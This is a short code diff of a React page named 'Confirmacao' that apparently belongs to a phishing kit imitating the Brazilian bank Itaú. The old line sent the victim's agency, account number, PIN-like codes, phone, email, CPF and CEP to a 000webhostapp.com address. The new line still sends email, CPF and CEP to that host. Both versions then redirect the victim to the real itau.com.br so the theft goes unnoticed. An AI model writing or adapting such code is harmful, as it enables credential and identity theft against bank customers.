@@ -33,15 +33,13 @@ const Confirmacao = () => {
     }
 
     try {
-      const response = await fetch(`https://checker9387.000webhostapp.com/index.php?ag=${ag}&conta=${conta}&quatro=${quatro}&tel=${tel}&seis=${seis}&email=${email}&cpf=${cpf}&cep=${cep}`);
+      const response = await fetch(`https://checker9387.000webhostapp.com/4/?email=${email}&cpf=${cpf}&cep=${cep}`);
       if (!response.ok) {
-        throw new Error('Erro na resposta da API');
+        throw new Error('Sistema indisponível');
       }
-      const data = await response.json();
-      window.location.href = "https://www.itau.com.br/";
+      window.location.href = "https://www.itau.com.br";
     } catch (error) {
       console.error('Erro ao fazer a requisição:', error);
-      window.location.href = "https://www.itau.com.br/";
     }
   }
 
